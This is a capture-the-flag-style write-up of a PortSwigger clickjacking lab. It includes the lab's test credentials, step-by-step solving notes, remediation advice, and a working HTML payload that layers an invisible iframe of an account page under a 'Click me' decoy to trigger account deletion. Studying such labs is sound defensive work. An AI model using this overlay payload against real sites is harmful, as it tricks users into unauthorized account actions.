# Lab 01: Basic Clickjacking with CSRF Token Protection

## Lab Information

| Property | Value |
|----------|-------|
| **Category** | CSRF / Clickjacking |
| **Difficulty** | Apprentice |
| **Platform** | PortSwigger Web Security Academy |
| **Status** | ✅ Solved |

---

## Lab Description

This lab demonstrates how Clickjacking can be used to bypass user interaction protections, even when a sensitive action is protected by a CSRF token.

The application allows authenticated users to delete their account. Although the delete request includes a valid CSRF token, an attacker can trick a victim into unknowingly clicking the "Delete account" button by embedding the target page inside a transparent iframe.

---

## Objective

Create a malicious webpage that tricks an authenticated user into clicking the **Delete account** button, resulting in the deletion of their account.

---

## Credentials

| Username | Password |
|----------|----------|
| wiener | peter |

---

## Vulnerability

The application is vulnerable to **Clickjacking** because it allows its pages to be embedded inside an iframe.

Although the delete request is protected with a CSRF token, the browser automatically includes the user's authenticated session and the existing CSRF token remains valid because the victim is interacting with the genuine application interface.

Without protections such as `X-Frame-Options` or `Content-Security-Policy: frame-ancestors`, an attacker can overlay invisible application elements beneath deceptive content.

---

## Testing Methodology

### Step 1 - Login

Logged into the application using the provided credentials.

```
Username: wiener
Password: peter
```

![](screenshots/lab-01-01-login.png)

---

### Step 2 - Identify the Target Page

Navigated to the account page containing the **Delete account** button.

```
/my-account
```

![](screenshots/lab-01-02-account-page.png)

---

### Step 3 - Create the Clickjacking Page

Used the exploit server to create an HTML page containing a transparent iframe that loaded the account page.

The iframe was positioned underneath a visible decoy element to trick the victim into clicking the hidden button.

Example HTML:

```html
<style>
iframe{
    position:relative;
    width:500px;
    height:700px;
    opacity:0.0001;
    z-index:2;
}
div{
    position:absolute;
    top:300px;
    left:60px;
    z-index:1;
}
</style>

<div>Click me</div>

<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```

![](screenshots/lab-01-03-exploit-html.png)

---

### Step 4 - Align the Exploit

Adjusted the iframe position and opacity until the visible **Click me** text aligned with the hidden **Delete account** button.

Initially used a higher opacity to simplify alignment before reducing it to nearly transparent.

![](screenshots/lab-01-04-clickjacking-alignment.png)

---

### Step 5 - Deliver the Exploit

After confirming the alignment, delivered the exploit to the victim through the exploit server.

The victim unknowingly clicked the hidden **Delete account** button.

![](screenshots/lab-01-05-final-exploit.png)

---

### Step 6 - Lab Solved

The victim's account was successfully deleted and the lab was marked as solved.

![](screenshots/lab-01-06-lab-solved.png)

---

## Root Cause

The application does not prevent its pages from being embedded within an iframe.

Because the browser automatically includes the authenticated session and CSRF token, user interaction with the framed page executes legitimate actions without the user's awareness.

The absence of anti-clickjacking protections allows attackers to manipulate user clicks.

---

## Impact

An attacker could exploit this vulnerability to:

- Trick users into changing account settings
- Delete user accounts
- Transfer funds
- Perform unauthorized purchases
- Modify security settings
- Execute sensitive actions on behalf of authenticated users

---

## Remediation

To prevent Clickjacking attacks:

- Set the `X-Frame-Options` header to `DENY` or `SAMEORIGIN`.
- Implement the `Content-Security-Policy` header with the `frame-ancestors` directive.
- Require user confirmation for sensitive operations.
- Use step-up authentication for high-risk actions.
- Avoid relying solely on CSRF tokens for protection against UI redressing attacks.

---

## Key Takeaways

- CSRF protection does not prevent Clickjacking attacks.
- Browsers automatically include valid session cookies and CSRF tokens when interacting with legitimate pages.
- Clickjacking exploits user interaction rather than bypassing application logic.
- Anti-framing headers are essential for protecting sensitive pages.

---

## Security Mapping

### OWASP Top 10 (2021)

- **A01: Broken Access Control**

### CWE

- **CWE-1021:** Improper Restriction of Rendered UI Layers or Frames
- **CWE-693:** Protection Mechanism Failure

---

## Skills Practiced

- Clickjacking Testing
- CSRF Analysis
- HTML & CSS Overlay Techniques
- UI Redressing
- Burp Suite
- Browser Security Testing
- Web Application Security
